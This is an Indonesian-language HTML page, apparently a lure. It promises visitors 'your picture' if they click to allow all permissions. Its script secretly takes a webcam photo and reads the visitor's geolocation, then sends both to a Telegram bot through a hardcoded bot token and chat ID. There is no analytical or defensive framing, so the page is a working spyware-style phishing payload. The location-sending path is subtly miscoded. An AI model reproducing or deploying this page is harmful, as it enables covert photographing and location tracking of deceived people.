<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akses Kamera dan Lokasi</title>
</head>
<body>
    <h1>Gambarmu di sini</h1>
    <button onclick="startCapture()">Izinkan semua untuk melihat gambar</button>
    <script>
        function startCapture() {
            // Akses kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Ambil foto setelah beberapa detik
                        setTimeout(() => {
                            captureAndSend(stream);
                        }, 2000); // Ambil foto setelah 2 detik
                    })
                    .catch(function(error) {
                        alert("Akses kamera ditolak.");
                    });
            } else {
                alert("Browser tidak mendukung akses kamera.");
            }

            // Akses lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('Lokasi Anda:', lat, lon);

                    // Kirimkan URL Google Maps ke Telegram
                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    sendToTelegram(`Lokasi Anda: ${locationUrl}`);
                }, function(error) {
                    alert("Gagal mendapatkan lokasi.");
                });
            } else {
                alert("Lokasi tidak tersedia.");
            }
        }

        function captureAndSend(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;

            // Pastikan video diputar terlebih dahulu sebelum menangkap gambar
            video.onloadedmetadata = () => {
                video.play(); // Memastikan video mulai diputar
            };

            // Tunggu sampai video siap diputar sebelum menangkap gambar
            video.oncanplay = () => {
                // Tentukan ukuran canvas sesuai dengan video
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // Tentukan ukuran canvas sesuai dengan video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                // Gambar dari video ke canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Ambil gambar sebagai Blob (bukan base64)
                canvas.toBlob(function(blob) {
                    // Kirim gambar ke Telegram
                    sendToTelegram(blob);

                    // Stop stream setelah gambar diambil
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg');
            };
        }

        function sendToTelegram(blob) {
            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
            const chatId = '1746156378';

            // Create FormData to send the image as a file
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');

            // Send the photo using sendPhoto API
            const url = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;

            fetch(url, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Gambar terkirim ke Telegram');
                } else {
                    console.log('Error mengirim gambar:', data);
                }
            })
            .catch(error => console.log('Error:', error));
        }
    </script>
</body>
</html>
